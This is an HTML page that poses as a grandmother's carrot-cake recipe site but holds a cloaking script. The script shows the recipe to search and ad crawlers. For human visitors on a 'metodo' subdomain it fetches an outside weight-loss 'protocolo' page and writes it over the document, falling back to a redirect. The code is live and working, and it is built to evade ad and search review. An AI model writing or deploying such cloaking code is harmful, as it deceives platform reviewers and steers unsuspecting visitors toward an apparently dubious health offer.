<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delícias da Vovó</title>
</head>
<body>

<script>
    const currentHost = window.location.hostname;
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);

    // SE FOR HUMANO NO SUBDOMÍNIO: Carrega o site da Lovable em tela cheia (Sem Iframe)
    if (currentHost.includes('metodo') && !isBot) {
        fetch('https://protocoloemagrecimentodivino.lovable.app/')
            .then(response => response.text())
            .then(html => {
                document.open();
                document.write(html);
                document.close();
            })
            .catch(err => {
                window.location.href = "https://protocoloemagrecimentodivino.lovable.app/";
            });
    }
</script>

<div style="padding: 20px; font-family: sans-serif;">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Esta é a receita tradicional da família...</p>
    <ul>
        <li>3 cenouras</li>
        <li>3 ovos</li>
    </ul>
</div>

</body>
</html>
